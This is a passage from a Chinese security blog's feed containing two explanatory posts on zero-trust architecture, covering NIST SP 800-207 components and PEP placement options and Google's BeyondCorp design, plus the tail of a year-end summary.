如果不能搞定人，那么有时候技术是没用的。慢慢也有人问你写文章能不能搞到钱。</p><p>可是真的有很多技术很好玩啊，就算不能变现，就算很忙很累，也愿意一探究竟。每个人小时候或许都想过，将来以微薄之力，改变世界，我们现在写的那些精巧的 paylaod 和代码逻辑，随着网线冲向浩瀚的互联网，不正是在改变着这个世界吗？</p><br><p style="text-align: center;"><font size="2px" color="gray">写文章其实并不难<br>难的是坚持写文章<br>今年新增了 318 位橘友<br>很高兴遇到你们！</font><br /><img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" style="zoom:30%" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;2021 马上就结束啦，我也来做个年终总结。&lt;/p&gt;</summary>
    
    
    
    <category term="经验总结" scheme="https://www.tr0y.wang/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="总结" scheme="https://www.tr0y.wang/tags/%E6%80%BB%E7%BB%93/"/>
    
    <category term="计划" scheme="https://www.tr0y.wang/tags/%E8%AE%A1%E5%88%92/"/>
    
  </entry>
  
  <entry>
    <title>零信任（二）NIST 架构与思考总结</title>
    <link href="https://www.tr0y.wang/2021/12/23/zero-trust-2/"/>
    <id>https://www.tr0y.wang/2021/12/23/zero-trust-2/</id>
    <published>2021-12-23T20:00:00.000Z</published>
    <updated>2023-05-04T09:44:57.360Z</updated>
    
    <content type="html"><![CDATA[<p>本篇是干货满满的架构设计介绍。</p><span id="more"></span><p>零信任系列分为两篇：</p><ol type="1"><li>历史 + BeyondCorp</li><li>NIST 架构 + 总结与思考</li></ol><p>本篇是 <code>NIST 架构 + 总结与思考</code></p><h2 id="nist-零信任架构">NIST 零信任架构</h2><p>这是美国国家标准与技术研究院（NIST）出的一份零信任白皮书（见资料 1）。内容如下：</p><ul><li>第一章开篇介绍零信任。介绍历史，回答了零信任的起源是什么</li><li>第二章定义了 ZT 和 ZTA，并列出了为企业建立零信任架构的要点，还包括了零信任设计原则的列表。回答了什么是零信任</li><li>第三章描述 ZTA 的逻辑组件或构成模块，以不同的方式组合 ZTA 组件是可行的，但其提供的是相同的逻辑功能。回答了零信任的有哪些组件构成以及它们的部署方案</li><li>第四章列出了 ZTA 一些可能的应用场景。这些 ZTA 应用场景让企业环境更安全，更不容易被入侵，包括远程员工、云服务和访客网络等。针对一些特定的场景，回答了零信任如何部署的问题</li><li>第五章讨论了 ZTA 环境下企业会面临的威胁。其中许多威胁是与传统的架构网络下的威胁相似，但可能需要不同的防御技术。回答了零信任存在哪些威胁以及如何解决/缓解这些威胁</li><li>第六章讨论 ZTA 原则如何适用和/或补充联邦机构现有的合规要求。这部分对我们用处不大</li><li>第七章讨论迁移到零信任的一些方案。回答了如何迁移到零信任架构的问题</li><li>后面的内容是附录。其中附录 B 是比较有价值的，对于零信任组件和解决方案的当前成熟度，进行了调查研究。回答了现阶段零信任存在哪些瓶颈以及问题。</li></ul><p>由于白皮书的内容还是比较多的，所以我这里挑一些我认为是重点的来讲。</p><p>这篇文章还是拿办公网零信任来举例，如果有特殊情况的话会标识出来。</p><h2 id="nist-架构">NIST 架构</h2><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/zero-trust-2/a8ff2099-c003-47cd-8273-3aaddd9b18a8.png!blog" /></p><p>这是 NIST 的零信任逻辑架构图，它展示了主要的组件与它们之间的交互关系：</p><ul><li>Subject：主体，发起访问的来源，不一定是人，也可能是机器</li><li>PDP：策略判定点，包含 PE、PA</li><li>PE(Policy Engine)：策略引擎，负责决定是否授予主体对资源的访问权限，它的核心作用是做信任评估</li><li>PA(Policy Administrator)：策略管理器，负责控制主体与资源之间的连接，会按照 PE 的决策结果，向 PEP 发出允许或拒绝连接等指令，还为主体创建用于访问资源的身份令牌或凭据。PA 的核心作用是策略判定点，是零信任动态权限的判定组件</li><li>PEP(Policy Enforcement Point)：策略执行点，负责执行决定。看起来是单个组件，实际上也可以进一步分为两个不同位置的组件：客户端组件（如用户侧的 Agent）与资源组件（如资源侧的网关）</li><li>CDM：持续诊断与缓解系统，负责收集关于企业系统当前状态的信息，并对配置和软件组件，应用已有的更新；还负责向策略引擎提供关于发出访问请求的系统的信息，例如它的操作系统、应用程序是否打过补丁，或者系统中是否存在已知的漏洞</li><li>Control Plane：控制平面，零信任组件之间通信走的链路</li><li>Data Plane：数据平面，用户访问应用走的链路</li><li>PKI：公钥基础设施</li><li>ID Management：身份管理</li><li>SEIM System：安全信息与事件管理系统，收集以安全为核心、可用于后续分析的信息</li></ul><p>到这里，我们就可以看懂用 NIST 术语来描述的零信任架构了。为什么要懂这个呢？因为后面根据不同的场景，会有不同的架构设计。但是看图我们很容易可以出一个结论：只有 PEP 的架构（位置、实现）会有不同，其他组件落地起来都是类似的。</p><p>从主体到企业资源这一条链路上，每一个点都可以部署 PEP。PEP 距离企业资源越近，PEP 防御面就越广，攻击者对企业资源的入侵成本也越高。</p><p>下面是结合 NIST 4 种抽象架构以及行业实践的经验总结得到的。</p><h3 id="pep-在主体中与资源前">PEP 在主体中与资源前</h3><p>这套方案是比较重的，基于 SDP 设计的方案。</p><p>此架构的 PEP 分为 2 部分：</p><ol type="1"><li>前置 PEP：如果主体是员工，则此 PEP 在员工电脑上，比如可以和 EDR 结合在一起；如果主体是应用（如生产网零信任），则此 PEP 在应用系统中，比如可以以应用 SDK 或独立进程存在</li><li>后置 PEP：每个应用都有一个 PEP，这样应用仅与后置的 PEP 通信。这个 PEP 本质上充当资源的反向代理，PEP 负责连接到 PA，根据 PA 配置的通信进行拦截或者放行。</li></ol><p>举例，一个用户通过笔记本电脑（已安装前置 PEP）连接到一个 HR 应用：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/zero-trust-2/351c5ad7-408b-4297-ae9a-b22046baf4ba.png!blog#width-zoom8" /></p><ol type="1"><li>用户向 HR 系统发起访问</li><li>该访问请求由本地代理 Agent 接收，然后将请求发送给策略管理器(PA)</li><li>策略管理器(PA)将请求转发到策略引擎(PE)进行评估。如果允许，则 PA 通过控制平面，在设备代理(前置 PEP)和 HR 应用的后置 PEP 之间配置通信通道（如包括IP 地址/端口、会话密钥等等）</li><li>设备代理(前置 PEP)和 HR 应用的后置 PEP 成功连接（可能还是加密的），开始通信</li><li>当通信结束，或发生安全事件（如会话超时、无法重新认证）时被策略管理器 PA 断开，连接终止</li></ol><h3 id="pep-在网关中">PEP 在网关中</h3><p>PEP 在网络中间链路的流量代理设备上，例如 Google 的 BeyondCorp 就是采用的此方式（有一个叫 Access Proxy 的组件）。这种 PEP 的实现依赖大量的研发工作，国内的互联网企业常选用 Nginx、流量网关等便于定制的系统作为代理网关，部分乙方厂商也基于硬件设备、防火墙等实现。</p><p>过程是非常直观的，就不多说了：<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/zero-trust-2/067c3444-984c-4f44-ae8a-ec1dfe36e759.png!blog#width-zoom8" /></p><p>但是，由于设备信息的收集是零信任非常重要的一个数据依赖，而从请求中可以拿到的设备信息非常少。所以这个图看起来不需要在设备上安装 agent，实际上还是需要安装一些软件或者是做一些改造的。</p><h3 id="pep-非常靠近资源">PEP 非常靠近资源</h3><p>该方式常见于云原生的 Sidecar 模式。其实本质上也是 PEP 在网关中的模式，但在部署形态、升级方面与 PEP 集成在网关中的方式有较大区别。</p><p>过程也是非常直观的：<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/zero-trust-2/266db058-3301-4f76-960f-264899198cf1.png!blog#width-zoom7" /></p><h3 id="pep-在资源中">PEP 在资源中</h3><p>PEP 以 SDK 或字节码形式集成在应用中，常见于大型互联网自研的中间件系统，存在极少厂商将 PEP 集成到应用的系统内核中。</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/zero-trust-2/7973d1d1-c0d4-4f2d-b60b-b3215d4fcc2e.png!blog#width-zoom7" /></p><h3 id="设备应用沙盒">设备应用沙盒</h3><p>还有基于设备应用沙盒的方案，简单地来说就是 PEP 只允许来自可信应用的访问，但是我感觉太理想化了，极难落地，这里就不多说了，感兴趣的橘友可以去看看白皮书。</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/zero-trust-2/2f398767-1f7d-47e6-a945-96467313d750.png!blog" /></p><h3 id="方案对比">方案对比</h3><p>各方案主要差异性对比如下（排除设备应用沙盒方案）：<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/zero-trust-2/8f6b1f31-d34b-4de3-a052-d2f25039478e.png!blog" /></p><p>我个人认为，PEP 部署在网关中这种模式，平衡安全效果与成本来说是最合适的。那么两个比较明显的缺点是：</p><ol type="1"><li>确保所有应用都接入 PEP：由于很多公司都有一个代理网关给应用接入（提供负载均衡等等统一功能），那么直接在这种代理网关上集成或者做旁路咨询的方式就可以解决应用需要全部接入 PEP 的问题。</li><li>缺少端上信息：可以考虑用安装统一的软件来采集，因为现在的公司都会要求在设备上强制安装公司的某个软件（这种覆盖率可以说是很接近 100%），所以只需要在这种软件上做改造就行了。当然会有一定的成本，但是投入产出比已经很高了</li></ol><p>另外，按照主体和资源的不同，企业内服务主要有办公网边界访问、生产网服务间访问、VPN 下访问办公网服务、生产网内部数据类服务等主要场景。不同的场景，有不同的方案。结合企业自身的情况，这几种不同的方案可以进行组合，做成一套多种形态的融合架构。</p><h2 id="思考">思考</h2><p>这里简单分享一些思考，希望起到抛砖引玉的作用。</p><h3 id="去边界">去边界</h3><p>这段时间我看了非常多的资料。有许多零信任的定义和讨论都强调去除以边界防御。但我认为边界是从物理/网络边界转变成了逻辑边界，并且更加贴近资源。所以消除边界其实只是消除物理/网络边界，完全没有边界的说法并不准确。并且，零信任的目的也并不是为了干掉边界，去掉网络边界是因为它已经没有用处了并且去掉之后还可以提升研发效能。</p><p>大多数实施零信任的公司还是混合着零信任架构和基于边界防御的架构。我觉得这一点并没有什么问题，毕竟身为打工人就需要考虑投入产出比，只要能解决实际问题就行了。</p><h3 id="零信任的安全风险">零信任的安全风险</h3><p>ZTA 肯定是不能彻底解决所有安全问题的（没有银弹）。它可以大大增加利用成本，比如迫使攻击者从撒网式钓鱼变成了鱼叉式钓鱼。</p><p>ZTA 还是比较年轻的技术。NIST 的白皮书指出：“ZTA 生态系统还没有成熟到足以大范围应用的程度”。并且还有一些未知的问题，在我们实施完零信任之后，可以进一步去探索：面对 ZTA，攻击者会如何反击？会不会出现新的威胁类型？已经采用 ZTA 的企业中，成功的入侵是什么样的？面对 ZTA，业务流程如何变化？等等。</p><p>当然，由于稳定性对于 ZTA 来说非常非常重要，所以攻击者也有可能尝试做 DDoS。但是这一点对于大部分业务/防护来说都很重要，传统的 VPN 其实也有这个问题。</p><p>从这一点来看，零信任非常需要可灰度、可监控、可回滚的能力。最理想的情况是，每次策略变更都可以通过监控对比旧策略与新策略的决策区别，确定没问题之后，分批按照百分比进行灰度，线上一旦发现问题可以马上回滚。这可以给运营人员提供强大的安全感，在上一个新的策略时，可以非常有效地分析管控的影响程度，出了问题也有及时止血的措施。</p><p>最后，智能算法能否用在动态能力上呢？我的倾向是尽量别用，策略/现象不可解释的话，排查问题的时候会非常痛苦。</p><h3 id="可持续运营">可持续运营</h3><p>上面的架构中没有提到运营，但其实运营层面的问题是尤为重要的。</p><p>对于办公网零信任来说，首先直接面向员工。站在用户的角度来说，他们不关心什么是零信任项目，也不关心这个项目是怎么实现的，他们只关心自己为什么没法访问这个页面，如果要解决的话，需要做什么。</p><p>如果仅仅在拦截页面放一个简单的提示，那么零信任运营人员会收到大量员工的支持请求：询问为什么无法访问以及怎么解决。长期下去会造成很多问题：</p><ol type="1"><li>零信任运营在答疑上疲于奔命；等待的人多，解决时间变长，就会阻碍员工的工作（影响研发效能）</li><li>员工过于依赖人工支持。后期在推广自助解决方案的时候（比如在拦截页面上写明原因与解决方式）会比较慢，因为对于他们来说已经习惯了直接找人工</li><li>员工认为只要没法访问一个页面（甚至包括外网页面），都认为是零信任的问题</li><li>员工由于体验不好，并不认可这个安全项目，可能会导致领导层的质疑与决策上的犹豫，毕竟零信任这种影响全公司的项目一定需要从上到下的支持</li><li>...</li></ol><p>为了方便诊断和解决更复杂的访问问题，可以设计一个网站来帮助用户和支持团队。不只是用一串通用错误代码来告诉用户他们的访问被拒绝，而是解释为什么他们被拒绝以及如何解决这个问题。比如一个应用要求员工申请后才可访问，那么这个页面可以提供拦截原因：“此应用设置了访问权限，被拦截是因为你没有申请访问权限。请点击链接申请，主管审批通过之后就可以访问”，附上到权限申请平台的链接，这样用户看到拦截页面之后，就知道点击申请，通过之后就可以访问了。</p><p>除了直接面向员工，零信任也直接面向业务侧。那么不同业务可能会有不同的鉴权方式（包括那些外采的应用），如何让它们统一接入 SSO 和如何打通业务权限和零信任的权限也都是重难点。如果没有打通，那么用户在访问应用的时候，需要在访问零信任之前登录（判断是哪个用户）然后做鉴权（判断这个用户有没有权限访问这个应用，没有的话可能需要申请），通过之后还要登录应用（应用本身的登录逻辑），如果应用有权限划分的话，那么可能还需要申请应用自己的权限码来访问特定的页面/功能。</p><p>这一套下来，会被业务方和用户骂死的。</p><p>除了提到的这些，还会有很多其他问题，由于现状不同，各个公司在落地上会遇到不同的问题，这是没法抄作业的。建议橘友们结合自身的情况，落地时不仅要在技术层面上思考，在运营层面的问题上也要多加思考。</p><h3 id="技术上的-忒修斯之船-悖论">技术上的 “忒修斯之船” 悖论</h3><p><strong>注：如果只关注某个技术能解决什么实际的问题，那么你可能确实不关心定位和概念，建议跳过这部分</strong></p><p>什么是 “忒修斯之船” 悖论？</p><p>忒修斯之船更换了 1 块木板，这艘船还能叫忒修斯之船吗？</p><p>忒修斯之船更换了 2 块木板，这艘船还能叫忒修斯之船吗？</p><p>直到忒修斯之船更换了所有的零件，这艘船还能叫忒修斯之船吗？</p><p>技术领域同样有这个问题。</p><p>新的技术总是层出不穷，如何理解这些新的技术？它们的定位什么？</p><p>零信任去掉一个小功能，还叫零信任，再增加掉一个小功能，还叫零信任...直到零信任慢慢变成一个防火墙，还叫零信任吗？</p><p>这个我称之为技术上的 “忒修斯之船” 悖论。</p><p>那么怎么解决这个问题呢？我认为，每个技术都可以把它分为两种能力，一种是核心能力，它是业界共识的特征。如果连这个都没有的话，并且也不打算往这个方向做，那么这个肯定是有问题的。额外能力是在实现核心能力的基础上，额外可以实现的能力。</p><p>比如说零信任可以实现部分防火墙的功能，同样防火墙也可以实现零信任的部分功能，但用于区别他们之间的就是核心能力。并且，如果用防火墙实现了零信任的核心能力要求，那么你把这套防火墙称为零信任项目也没有什么问题。</p><p>需要注意的是，这里说这么多，目的并不是为了纠结这个概念。而是在大方向上提供重要的指导意义：我们<strong>要以完善核心能力为主要目的，额外能力作为建设的补充</strong>，它属于锦上添花而不是雪中送炭。如果集中精力建设的是额外能力，那么可能需要结合一下要解决的实际问题，去判断一下我们到底需不需要零信任，你需要的可能是另外一种技术。</p><h2 id="总结">总结</h2><p>这里放上我整理的思维导图（此图较大），起到一个总结的作用：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/zero-trust-2/NIST—零信任架构.png!blog" /></p><p>零信任系列就暂告一段落了。这个系列后面应该还会有新的文章，等我继续实践之后，再来多分享一些落地上的经验。</p><p>我最近在做办公网零信任的建设，如果你有相关经验或者问题，非常欢迎联系我，我们可以交换一下建设经验，提升彼此的安全水位，开门造车，合作共赢。</p><h2 id="资料">资料</h2><ol type="1"><li>《NIST — 零信任架构》<ul><li>后台回复：bt-nist</li></ul></li></ol><br><p style="text-align: center;"><font size="2px" color="gray">2021 马上就结束了<br>年初的 Flag 完成得如何啦？<br>从各个公司对 log4shell 的反应可以看出很多有意思的事情<br>这份年底大考分为两卷<br>考核内容为安全建设和应急响应<br>你都及格了吗？</font><br /><img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" style="zoom:30%" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;本篇是干货满满的架构设计介绍。&lt;/p&gt;</summary>
    
    
    
    <category term="经验总结" scheme="https://www.tr0y.wang/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="安全建设" scheme="https://www.tr0y.wang/tags/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
  </entry>
  
  <entry>
    <title>零信任（一）简史与 BeyondCorp</title>
    <link href="https://www.tr0y.wang/2021/12/11/zero-trust-1/"/>
    <id>https://www.tr0y.wang/2021/12/11/zero-trust-1/</id>
    <published>2021-12-11T19:00:00.000Z</published>
    <updated>2023-05-04T09:44:57.356Z</updated>
    
    <content type="html"><![CDATA[<p>零信任其实是一种安全理念：“永不信任，始终验证”。</p><span id="more"></span><p>零信任系列分为两篇：</p><ol type="1"><li>历史 + BeyondCorp</li><li>NIST 架构 + 总结与思考</li></ol><p>本篇是 <code>历史 + BeyondCorp</code></p><h2 id="历史">历史</h2><p>发展历史其实没那么重要，橘友们当做故事看就好了，我也是复制粘贴的。</p><p>// ctrl+c from 资料 1</p><p>零信任的最早雏形源于 2004 年成立的耶利哥论坛，其成立的使命正是为了定义无边界趋势下的网络安全问题并寻求解决方案，提出要限制基于网络位置的隐式信任，并且不能依赖静态防御。</p><p>2010 年，著名研究机构 Forrester 的首席分析师 John 正式提出了零信任这个术语，明确了零信任架构的理念，该模型改进了耶利哥论坛上讨论的去边界化的概念，并提出三个核心的观点：</p><ol type="1"><li>不再以一个清晰的边界来划分信任或不信任的设备</li><li>不再有信任或不信任的网络</li><li>不再有信任或不信任的用户</li></ol><p>2013 年，国际云安全联盟（CSA）成立软件定义边界（SDP）工作组。SDP 作为新一代网络安全解决理念，其整个中心思想是通过软件的方式，在移动和云化的时代，构建一个虚拟的企业边界，利用基于身份的访问控制，来应对边界模糊化带来的粗粒度控制问题。</p><p>2014 年，谷歌基于内部项目 BeyondCorp 的研究成果陆续发布 6 篇相关论文，介绍零信任落地实践。BeyondCorp 采用了零信任的思想，设计理念如下：</p><ol type="1"><li>所有网络都不可信；</li><li>以合法用户、受控设备访问为主</li><li>所有服务访问都要进行身份验证、授权加密处理</li></ol><p>同年，CSA 发布了《SDP 标准规范 V1.0》英文版（中文版于 2019 年发布）</p><p>2017 年，Gartner 在安全与风险管理峰会上发布持续自适应风险与信任评估（Continuous Adaptive Risk and Trust Assessment, CARTA）模型，并提出零信任是实现 CARTA 的初始步骤，后续两年又发布了零信任网络访问（Zero-Trust Network Access, ZTNA）市场指南（注：SDP 被 Gartner 称为 ZTNA）。</p><p>2018 年，Forrester 提出零信任拓展生态系统（Zero Trust eXtended, ZTX）研究报告，将视角从网络扩展到用户、设备和工作负载，将能力从微隔离扩展到可视化、分析、自动化编排，并提出身份不仅仅针对用户，还包括 IP 地址、MAC 地址、操作系统等。简言之，具有身份的任何实体包括用户、设备、云资产、网络分段都必须在零信任架构下进行识别、认证和管理。</p><p>2020 年，美国国家标准技术研究所（NIST）发布的《SP800-207: Zero Trust Architecture》标准对零信任架构 ZTA 的定义如下：利用零信任的企业网络安全规划，包括概念、思路和组件关系的集合，旨在消除在信息系统和服务中实施精准访问策略的不确定性。该标准强调零信任架构中的众多组件并不是新的技术或产品，而是按照零信任理念形成的一个面向用户、设备和应用的完整安全解决方案。</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/zero-trust-1/20211209150908.png!blog" /></p><p>// crtl+v</p><p>里面有很多的术语，我先总结一下：</p><ul><li>ZT：即零信任</li><li>ZTN：即零信任网络</li><li>ZTA：即零信任安全架构</li><li>ZTNA：即零信任网络访问，Gartner 嘴里的 SDP</li><li>SDP：即软件定义边界，构建 ZTN 最复杂的方案</li><li>BeyondCorp：我感觉也不是用完全体的 SDP 实现的</li><li>NIST 草案：定义了 SIM 以及指导架构设计<ul><li><code>SDP</code>：这个就是软件定义边界</li><li><code>IAM</code>：即身份管理系统</li><li><code>MSG</code>：微隔离</li></ul></li></ul><p>似懂非懂？这太正常了。</p><p>从整个发展历史来看，其实最有价值的还是 BeyondCorp 的六篇论文和 NIST 的架构设计，这也是为什么这个系列主要说的是这两个内容。</p><p>我的预期是看完 BeyondCorp 之后，橘友们对零信任概念以及实现有了基本了解，看完 NIST 的架构之后，对落地能有自己的思考。最后还有我的思考与总结，向橘友们分享一下我的想法。</p><h2 id="beyondcorp">BeyondCorp</h2><p>在开始之前，我想先和大家说一个我自己的结论：<strong>零信任其实包含了办公网零信任和生产网零信任</strong>。如果这么去理解的话，BeyondCorp 其实指的是办公网零信任。</p><p>BeyondCorp 六篇论文分为以下几个主题：</p><ol type="1"><li>BeyondCorp 简介</li><li>方案的设计与落地</li><li>深入介绍重要组件</li><li>迁移的方式与挑战</li><li>解决用户体验问题</li><li>自身的安全性保障</li></ol><p>我十分推荐大家去看看论文（见资料 2），光看主题就可以感受到谷歌分享技术的诚意。</p><h3 id="是什么">是什么？</h3><p>首先橘友们最关心的肯定是这个 BeyondCorp 到底是什么。</p><p>BeyondCorp 的目标是：<strong>摒弃企业特权网络并开创一种全新访问模式</strong></p><p>...在这种全新的无特权网络访问模式下，<strong>访问只依赖于设备和用户凭证</strong>，而与用户所处的网络位置无关，无论用户是在公司“内网”、家庭网络、酒店还是咖啡店的公共网络，<strong>所有对企业资源的访问都要基于设备状态和用户凭证进行认证、授权和加密</strong>。</p><p>这种新模式可以<strong>针对不同的企业资源进行细粒度的访问控制</strong>，所有谷歌员工都可以从任何网络成功发起访问，无需通过传统的 VPN 连接进入特权网络，除了可能存在延迟差异外，对企业资源的本地和远程访问用户体验基本一致...</p><p>这一大段是摘自谷歌关于 BeyondCorp 那 6 篇论文里的第 1 篇。这里的重点我已经帮大家标记出来了。那么，这些话显然是很虚的 <del>，确实有很多公司自称在认真做安全建设，大谈前沿概念，实际上是在吹牛*</del> 。所以我们接下来看看他们是怎么实现这些目标的。</p><h3 id="怎么实现">怎么实现？</h3><p>我觉得这个才是我们比较关心的。</p><p>这个是我画的 BeyondCorp 架构图，我把它分为 3 个大块：</p><ol type="1"><li>红框：接管流量</li><li>绿框：执行策略</li><li>黄框：信息收集</li></ol><p>也就是图里的这三个虚线框围住的部分。我们先不看他们各个模块之间的交互，先看一下各个模块是做什么用的。</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/zero-trust-1/20211209150722.png!blog" /></p><h4 id="接管流量">接管流量</h4><p>首先来看这个红色的框：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/zero-trust-1/20211209151702.png!blog#width-zoom5" /></p><ul><li>外网：这个就不用说了，就是非公司的网络，比如在家或者在咖啡厅之类的地方，发起的访问。</li><li>特权网络：说白了就是公司的办公网，为什么叫有特权呢？因为一般我们认为如果你是通过办公网来访问或者通过 VPN 来访问的，那么你就是自己人了，内网很多系统对于来源是办公网的，可能都没有加访问控制甚至都不需要登录就可以直接使用。那实际上办公网就是有特权的，所以叫特权网络。</li><li>无特权网络：这个要对比与特权网络来理解。知道特权网络的含义后，那么无特权网络自然就是，就算你位于办公网，发起的访问也没有特权，该登录还是要登录，不让访问的还是不能访问。这就是所谓的无特权网络。</li><li>访问代理：这个其实就是一个 7 层的代理，可以类比为 Nginx（据我所知，目前很多公司都有一个前置的 Nginx 集群，也可能魔改过）。它是可以被外网直接访问到的，谷歌把办公网应用 cname 到访问代理，直接对公网暴露。这里我把访问代理和网关分开来画了，实际上他们是集成的。</li><li>网关：网关是访问资源的唯一通道，所以这个代理的真正职能其实是网关来完成的，替代用户向应用发起访问。还有一点需要注意的是，它与应用之间的通信是加密的。</li><li>SSO：这是提供统一认证的地方，所有应用接入 SSO 做认证和权限划分，虽然应用内部的权限划分还是由应用 owner 自己来设计，但是需要在 SSO 上配置，由 SSO 来完成权限管理。</li><li>RADIUS：对于有线和无线访问，不再依赖交换机/端口的静态配置，而是使用 RADIUS（谷歌使用基于 802.1x 认证的 Radius）来通知交换机，将认证后的设备分配到对应的的 VLAN。</li></ul><h4 id="执行策略">执行策略</h4><p>接下来来看一下绿框部分：<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/zero-trust-1/20211209151934.png!blog#width-zoom5" /></p><ul><li>访问控制引擎：访问代理的咨询对象，它会告诉访问代理，对于本次请求你应该怎么处理，比如放过还是拦截还是其他执行动作。</li><li>访问控制策略：包含了所有管控的逻辑。比如跳二次认证、拒绝访问。那橘友们可能会想为什么不把访问代理和访问控制引擎集成在一起呢。因为访问代理它不一定只给 BeyondCorp 使用，因为通常的方案是用业务那边负载均衡直接加功能得到的，所以其实业务本身也会用到。如果强耦合的话会很混乱，既有业务功能，也有安全功能，每次变更就会变得更加危险。</li><li>异步策略：这是用来实施强制措施的。比如踢出登录态、风险或者威胁推送、网络隔离等等。</li></ul><h4 id="信息收集">信息收集</h4><p>接下来来看一下黄框部分：<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/zero-trust-1/20211209152246.png!blog#width-zoom8" /></p><ul><li>信任引擎：是用来做信任等级计算的</li><li>信任等级：资源有等级，设备也有等级。比如给访问来源设定了几个不同级别的信任等级（外包员工、正式员工等等）；对于资源来说，就是比如办公网应用啊什么打印机啊这种的，他们的等级是可以根据防护等级或者安全等级来划分。类似的，还有人员相关的信息，谷歌这部分是与 HR 系统集成的。然后每次设备信息发生变动都会重新计算一次设备等级。这种离线计算的模式有很多优点，比如....。那么它的缺点是并不是所有的信息都可以使用预计算的，这也是为什么会有一些必要的静态策略存在的原因。</li><li>资产清单：资产清单说起来是非常简单的，就是设备的一切信息。但是做起来相当麻烦。首先这部分数据量是非常大的，比如所有者、设备的硬件信息（甚至是硬盘、网卡、主板的编号）、操作系统信息，包括证书、操作系统版本和补丁等等，数据量一大各种问题就随之而来，比如延迟、存储、同步问题如何解决。其次是所有来自不同数据源的数据都需要聚合、关联到某一设备。那么如何进行关联就是一个非常棘手的事情。最后考虑到人为的数据录入错误，情况还会更加复杂。所以这块的工作说起来简单做起来踩到的坑却非常非常多，谷歌花费了很多年的时间才实现基于资产清单的策略。</li><li>证书：设备证书的第一个作用是标识设备的唯一 ID，第二是在 Radius 那边做认证，第三是它会透传给后面的网关，网关用设备提供的证书，用来与应用通信加密。</li></ul><p>上面这些组件看起来相当复杂，可能不太直观，我举个例子吧。</p><p>比如我的电脑被偷了，我去找 IT 报备。IT 在 IT 部门的资产库中，打个标，表明此设备已丢失。然后资产清单在定期轮训 IT 资产库的时候，将这个丢失的信息同步过来。信任引擎在进行定期计算的时候，发现这个设备丢失了，于是把这个设备的信任等级降至最低。那么访问控制引擎在做判断的时候，由于设备安全等级非常低，所以大部分应用都不允许访问，引导到丢失设备的提示页去。</p><h4 id="完整架构">完整架构</h4><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/zero-trust-1/20211209150722.png!blog" /></p><p>最后我们再来整体地看一下这个流程，我举两个例子：</p><ol type="1"><li>一名工程师在公司发起对代码库的访问。首先，连入公司的 wifi，Radius 要求设备提供证书，通过之后，在无特权网络上分配一个地址。接着工程师访问代码库，请求指向访问代理，笔记本电脑提供设备证书。这一步通常会涉及到客户端的改造，比如浏览器，需要安装一个插件，这个插件会在访问办公网应用的时候，自动提交证书。接下来，访问代理无法识别用户，重定向到单点登录系统。工程师登录，由 SSO 进行身份认证，颁发令牌，并重定向回访问代理，访问代理现在持有设备证书和标识用户的登录令牌，就继续往后走。就这次请求，向访问控制引擎咨询应该如何处理。假设访问控制引擎同意，那么网关会使用刚才拿到的证书，访问应用，它们之间的流量是加密的。</li><li>一名工程师在家发起对代码库的访问。这个也就是我们常说的员工在外网访问。工程师用公司的电脑，连到自己家的 wifi，然后访问办公网应用，同样，浏览器插件会自动提交设备证书。接下来的过程与第一个例子一模一样。</li></ol><p>再看一个更加具体的例子：</p><p><code>codereview.corp.google.com</code> 这个是谷歌的一个办公网应用，我们看下 DNS 解析记录：<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/zero-trust-1/20211209153359.png!blog" /></p><p>可以看到 <code>codereview.corp.google.com</code> 直接在在公共 DNS 中注册，CNAME 指向访问代理。</p><p>访问会跳到 SSO：<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/zero-trust-1/20211209153531.png!blog" /></p><h3 id="解决了什么问题">解决了什么问题？</h3><p>那么到这里我们对谷歌实现 BeyondCorp 整体有了一个比较清楚的了解。不过其实更重要的是要知道它解决了什么问题，我们才会去考虑我们到底要不要跟风做这么一个东西，<strong>盲目地追逐新概念其实是很危险的</strong>。</p><p><strong>只关注边界安全，一旦边界被突破则畅通无阻</strong></p><p>在传统的安全方案中，几乎所有企业都会采用防火墙来增强边界安全。这种安全模型可以类比成我们的公司。守卫森严，每个出入口都有保安并且要求刷卡，似乎门禁能被突破的可能性很低。而根据墨菲定律，只要一件事它有发生的概率，那么随着时间的推移它就一定会发生。所以这种安全模型是存在问题的：一旦边界被突破，攻击者可以畅通无阻地访问企业的内部特权网络。从我个人体验来说，护网也好，红蓝对抗也好，感觉从办公网被突破的概率是非常大的，反而是生产网不太容易被突破。</p><p><strong>边界不再由企业的物理位置决定</strong></p><p>当所有员工都只在办公大楼中工作时，边界安全模型确实很有效；然而，随着移动办公的出现、办公使用的设备种类激增，边界变得越来越复杂。</p><p>另外，现在很多公司都在上云，云服务的使用越来越广泛，那么所谓的“边界”其实不再由企业的物理位置决定。定义边界越来越复杂和困难，那么基于边界的防守也就越来越容易出现疏漏。</p><p><strong>难以平衡效率与安全性</strong></p><p>连入 VPN 